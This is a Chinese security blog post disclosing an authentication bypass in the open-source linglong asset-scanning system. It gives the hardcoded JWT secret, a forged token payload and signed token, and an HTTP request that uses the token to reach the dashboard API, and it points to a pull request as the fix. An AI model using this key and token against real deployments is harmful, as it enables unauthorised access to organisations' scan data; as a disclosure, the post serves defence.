---
title: "linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇"
source: https://mrxn.net/jswz/awake1t-linglong-authorization-bypass.html
asset_dir: assets/linglong一款甲方资产巡航扫描系统的jwt硬编码密钥之殇
---

# linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇

[Mrxn](https://mrxn.net/author/1)- 发表于2024/4/25 12:37
- 5232浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

Windows安全工具

安全研究工具

编码转换工具

---

# 前言

GitHub上 awake1t/linglong 一款使用golang做后端,vue做前端的甲方资产巡航扫描系统.系统定位是发现资产，进行端口爆破。  
帮助企业更快发现弱口令问题。主要功能包括: 资产探测、端口爆破、定时任务、管理后台识别、报表展示.其当初还加入过知道创宇的404StarLink的星链计划.  
但是由于年久失修,最近被爆出认证绕过漏洞,其实这个洞在两年前的pull中就有人提出来了,其次根据jwt.go文件提交记录,最早可以追溯到四年前.

漏洞修复方案

# 漏洞分析+复现

在 http[s]://github[.]com/awake1t/linglong/blob/e28f319a9bb5895453a507d759b7e83bb4b58f2c/pkg/utils/jwt.go#L10 中  
硬编码 jwt 密钥为 `213123dd1`.导致任意人都可以通过此密钥来伪造一个合法的 jwt token.从而通过系统认证.

深入探索

安全认证考试

Web安全课程

安全研究报告

[![linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇](images/img-001-3c3d0da55815.png)](https://mrxn.net/content/uploadfile/202404/1f971714060364.png)

而linglong的认证组成部分也在上面可以看到,因此我们可以伪造如下

深入探索

Nessus

网络安全培训

授权

```
{
  "username": "linglong",
  "password": "123456",
  "exp": 1714068736,
  "iss": "linglong"
}
```

[![linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇](images/img-002-3b4b9a7cf9e0.png)](https://mrxn.net/content/uploadfile/202404/efac1714060539.png)

得到一个合法的token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imxpbmdsb25nIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJleHAiOjE3MTQwNjg3MzYsImlzcyI6Imxpbmdsb25nIn0.rCCTJD_LF08XUwAxZhtOTS-eC3OOtdMAy08LpK1ngh8
```

将其带入header的 Authorization 去请求主页面板的API接口

```
GET /api/v1/dashboard HTTP/1.1
Host: 127.0.0.1:18000
Accept-Language: zh-CN,zh;q=0.9
Referer: http://127.0.0.1:8001/
Accept-Encoding: gzip, deflate, br, zstd
Origin: http://127.0.0.1:8001
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imxpbmdsb25nIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJleHAiOjE3MTQwNjg3MzYsImlzcyI6Imxpbmdsb25nIn0.rCCTJD_LF08XUwAxZhtOTS-eC3OOtdMAy08LpK1ngh8
Accept: application/json, text/plain, */*
```

可以成功通过系统认证获取到数据

[![linglong:一款甲方资产巡航扫描系统的JWT硬编码密钥之殇](images/img-003-8d086a3519e9.png)](https://mrxn.net/content/uploadfile/202404/7b2c1714060881.png)

如果需要修复,可以参考 `pull #75` 进行修复.

- 标签：
- [#黑客工具](https://mrxn.net/tag/%E9%BB%91%E5%AE%A2%E5%B7%A5%E5%85%B7)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.前言](#toc-1-)
- [2.漏洞分析+复现](#toc-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
